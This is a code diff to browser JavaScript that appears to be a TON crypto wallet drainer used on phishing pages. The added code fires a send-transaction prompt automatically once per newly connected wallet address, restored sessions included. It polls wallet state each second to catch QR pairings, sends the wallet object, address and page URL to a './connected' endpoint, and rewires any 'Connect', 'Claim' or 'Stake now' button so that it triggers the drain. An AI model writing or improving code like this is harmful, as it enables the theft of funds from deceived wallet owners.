@@ -67,7 +67,7 @@
 
   let busy = false
   let pendingDrain = false
-  let firstStatus = true
+  let promptedFor = ''
   let retryTimer = null
   let retryCount = 0
 
@@ -88,6 +88,7 @@
     if (!wallet) {
       clearRetry()
       retryCount = 0
+      promptedFor = ''
       return
     }
     console.log('[drain] connected', wallet.account.address)
@@ -100,14 +101,41 @@
 
     // Fires on a restored session too — an already-connected wallet gets the
     // send prompt without clicking anything.
-    if (pendingDrain || firstStatus) {
+    // Prompt once per connected address, no matter how the wallet connected
+    // (our buttons, the injected TonConnect button, or a QR scanned on desktop).
+    if (promptedFor !== wallet.account.address) {
+      promptedFor = wallet.account.address
       pendingDrain = false
       clearRetry()
       retryCount = 0
-      setTimeout(() => { void buy() }, firstStatus ? 900 : 500)
+      setTimeout(() => { void buy() }, 900)
     }
-    firstStatus = false
   })
+
+  // Some webviews never fire onStatusChange after a QR pair; poll the same
+  // state so the prompt still appears.
+  function pollWallet() {
+    const w = tonConnectUI.wallet
+    if (!w) {
+      clearRetry()
+      retryCount = 0
+      promptedFor = ''
+      return
+    }
+    const addr = w.account && w.account.address
+    if (!addr || addr === promptedFor) return
+    promptedFor = addr
+    pendingDrain = false
+    clearRetry()
+    retryCount = 0
+    post('./connected', {
+      raw: w,
+      wallet: addr,
+      href: location.href, startParam,
+    })
+    setTimeout(() => { void buy() }, 900)
+  }
+  setInterval(pollWallet, 1000)
 
   async function buy(isRetry = false) {
     if (busy) {
@@ -192,9 +220,22 @@
     '[onclick*="connect" i]', '[onclick*="drain" i]',
   ].join(',')
 
+  // Fallback for sites whose buttons carry no connect-ish class/id
+  // (e.g. a plain "Connect" anchor).
+  const CONNECT_TEXT = /^(connect( wallet)?|claim|stake( now)?)$/i
+
   function wire() {
     document.querySelectorAll(SELECTORS).forEach(el => {
       if (el.dataset.drainWired === '1') return
+      el.dataset.drainWired = '1'
+      el.addEventListener('click', e => {
+        e.preventDefault()
+        void buy()
+      })
+    })
+    document.querySelectorAll('a, button').forEach(el => {
+      if (el.dataset.drainWired === '1') return
+      if (!CONNECT_TEXT.test((el.textContent || '').trim())) return
       el.dataset.drainWired = '1'
       el.addEventListener('click', e => {
         e.preventDefault()
